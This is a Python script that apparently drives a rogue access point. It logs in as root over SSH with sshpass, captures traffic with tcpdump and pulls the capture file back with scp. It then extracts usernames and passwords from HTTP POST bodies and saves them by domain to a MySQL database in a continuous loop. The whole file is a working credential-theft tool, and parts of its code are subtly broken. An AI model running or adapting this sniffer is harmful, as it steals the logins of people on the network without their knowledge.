#!/usr/bin/env python3

import os
import dpkt
import json
import socket
import datetime
from time import sleep
from base64 import b64decode
import mysql.connector
from multiprocessing import Process
from savetodb import addcreds
from dpkt.compat import compat_ord

with open("config",'r') as file:
    CONFIG = json.load(file)

def mac_addr(address):
    return ':'.join('%02x' % compat_ord(b) for b in address)

def inet_to_str(inet):
    try:
        return socket.inet_ntop(socket.AF_INET, inet)
    except ValueError:
        return socket.inet_ntop(socket.AF_INET6, inet)

def checkCreds(params):
    unames = ["uname", "user", "username", "mail", "userid", "email"]
    for u in unames:
        for param in params.decode().split("&"):
            if(u in param):
                user = param.split("=")[1]
                psw = checkPass(params)
                if(psw is not None and user is not None):
                    return user, psw
            else:
                pass

def checkPass(params):
    passs = ["psw", "pass", "password", "pword"]
    for p in passs:
        for param in params.decode().split("&"):
            if(p in param):
                return param.split("=")[1]

def get_capture():
    os.system("timeout 5 sshpass -p %s ssh root@%s tcpdump not port 22 -w capture.pcap > /dev/null" % (CONFIG['root_pass'], CONFIG['IP']))
    os.system("sshpass -p %s ssh root@%s killall tcpdump" % (CONFIG['root_pass'], CONFIG['IP']))
    os.system("sshpass -p %s scp root@%s:/root/capture.pcap ." % (CONFIG['root_pass'], CONFIG['IP']))
    os.system("sshpass -p %s ssh root@%s rm capture.pcap" % (CONFIG['root_pass'], CONFIG['IP']))

def analyse():
    f = open('capture.pcap','rb')
    pcap = dpkt.pcap.Reader(f)

    cnx = mysql.connector.connect(host="localhost",user=CONFIG['db_user'],password=CONFIG['db_pass'],database='pine_db')
    cursor = cnx.cursor()


    for timestamp, buf in pcap:
        eth = dpkt.ethernet.Ethernet(buf)
        if not isinstance(eth.data, dpkt.ip.IP):
            print('Non IP Packet type not supported %s\n' %     eth.data.__class__.__name__)
            continue
        ip = eth.data
        if isinstance(ip.data, dpkt.tcp.TCP):
            tcp = ip.data
            try:
                request = dpkt.http.Request(tcp.data)
            except (dpkt.dpkt.NeedData, dpkt.dpkt.UnpackError):
                continue
                params = request.body
            if(request['method'] == "POST"):
                user = None
                psw = None
                domain = None
                try:
                    user, psw = checkCreds(request.body)
                    domain = request['headers']['host']
                except TypeError:
                    pass
                if(user is None and psw is None and domain is None):
                    pass
                elif(user is not None and psw is not None and domain is None):
                    addcreds(cursor, user, psw, "Couldn't Fetch")
                elif(user is not None and psw is not None and domain is not None):
                    addcreds(cursor, user, psw, domain)
                else:
                    print(request.body)
                    print("Press enter to continue")
                    input()
                    pass
                cnx.commit()
def start():
    count = 0
    while True:
        try:
            get_capture()
            sleep(2)
            analyse()
            print("Done analysing round %s" % (str(count)))
            count+=1
            sleep(5)
        except KeyboardInterrupt:
            print("User Interrupted :(")
            break
